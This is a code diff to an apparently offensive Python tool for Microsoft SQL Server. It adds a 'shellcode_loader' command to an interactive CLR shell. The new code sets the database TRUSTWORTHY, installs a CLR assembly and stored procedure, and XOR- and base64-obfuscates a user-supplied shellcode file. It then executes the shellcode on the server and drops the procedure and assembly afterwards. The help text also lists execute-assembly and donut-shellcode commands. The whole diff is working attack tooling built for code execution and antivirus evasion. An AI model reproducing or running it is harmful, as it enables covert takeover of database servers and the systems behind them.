@@ -21,6 +21,7 @@ def connect(host,port,username,password,dbname,id=0):
         info_dict["password"]=password
         info_dict["db_name"]=dbname
         info_dict["id"]=id
+        info_dict["mssql"]=cursor
         return cursor
     except Exception as error:
         print("[-] connect {}:{} Faiure\n{},".format(host,port,error)+str(error))
@@ -180,6 +181,25 @@ def clr_install(mssql):
     except Exception as error:
         print("[-] Error Install Clr Failure,"+str(error))
 
+def shellcode_Load_clr(mssql):
+    try:
+        print("[*] shellcode_Load_clr Loading....")
+        sql=open("lib/mssql_clr_shellcode_load.txt","r",encoding="utf-8").read()
+        privile=query_sql(mssql,f"ALTER DATABASE {info_dict['db_name']} SET TRUSTWORTHY ON")
+        if privile==None:
+            print("[+] Set permission Done")
+            create_assembly=query_sql(mssql,sql)
+            if create_assembly==None or create_assembly==create_assembly==[(1,)]:
+                print("[+] create_assembly sucess")
+
+            create_procedure=query_sql(mssql,"CREATE PROCEDURE [dbo].[shellcode_loader] @sc NVARCHAR (MAX) AS EXTERNAL NAME [Database1].[StoredProcedures].[shellcode_loader]")
+            if create_procedure==None:
+                 print("[+] create_procedure sucess")
+        else:
+            print("[-] Set permission Failure")
+    except Exception as error:
+        print("[-] Error Install Clr Failure,"+str(error))
+
 def clr_uninstall(mssql):
     try:
         sql="drop PROCEDURE dbo.sp_help_text_tables;drop assembly sys_objects_mssql_log"
@@ -210,6 +230,7 @@ def clr_shell(mssql):
     clr_scloader {shellcode}      - shellcode.bin
     clr_assembly {prog} {args}    - execute-assembly.   
     clr_assembly_sc {shellcode}   - assembly shellcode created by donut.   
+    shellcode_loader             - Shellcod encrypt load (tips:x64 shellcode)
 '''
     import logging
     from impacket.examples import logger
@@ -248,24 +269,43 @@ def clr_shell(mssql):
             user=input("CLR_SHELL>")
             if user=="exit":
                 break
-            space_list=user.split(" ")
-            clr_name=space_list[0]
-            clr_param=space_list[1:]
-            clr_command=clr_name+" "+" ".join(clr_param)
-            print(clr_command)
-            ms_sql.sql_query(f'''exec dbo.sp_help_text_tables "{clr_command}"''')
-            ms_sql.printReplies()
+
+            if user=="shellcode_loader":
+                shellcode_Load_clr(info_dict["mssql"])
+                file_input = input("shellcode_file>")
+                if os.path.exists(file_input):
+                    import base64
+                    fdata = open(file_input, "rb").read()
+                    data = base64.b64encode(fdata).decode()
+                    result = ""
+                    for x in data:
+                        result += chr(ord(x) ^ 8)
+                    encdata = base64.b64encode(result.encode()).decode()
+                    shellcode_buff = encdata[::-1]
+                    print(f"[*] the encrypt shellcode_buff size:{len(shellcode_buff)}")
+                    print(shellcode_buff)
+                    ms_sql.sql_query(f'''exec shellcode_loader \'{shellcode_buff}\'''')
+                    ms_sql.printReplies()
+
+                    ms_sql.sql_query("drop PROCEDURE dbo.shellcode_loader")
+                    ms_sql.printReplies()
+
+                    ms_sql.sql_query("drop assembly Database1")
+                    ms_sql.printReplies()
+
+            else:
+                space_list = user.split(" ")
+                clr_name = space_list[0]
+                clr_param = space_list[1:]
+                clr_command = clr_name + " " + " ".join(clr_param)
+                print(clr_command)
+                ms_sql.sql_query(f'''exec dbo.sp_help_text_tables "{clr_command}"''')
+                ms_sql.printReplies()
+
+
         ms_sql.disconnect()
     except Exception as error:
         print("[-] CLr Shell Error,"+str(error))
-
-
-    try:
-        sql='''exec sp_help_text_tables "clr_pwd"'''
-        output = query_sql(mssql, sql)
-        print(output)
-    except Exception as error:
-        print("[-] Error Uninstall Clr Failure," + str(error))
 
 if __name__ == '__main__':
     parser=optparse.OptionParser()
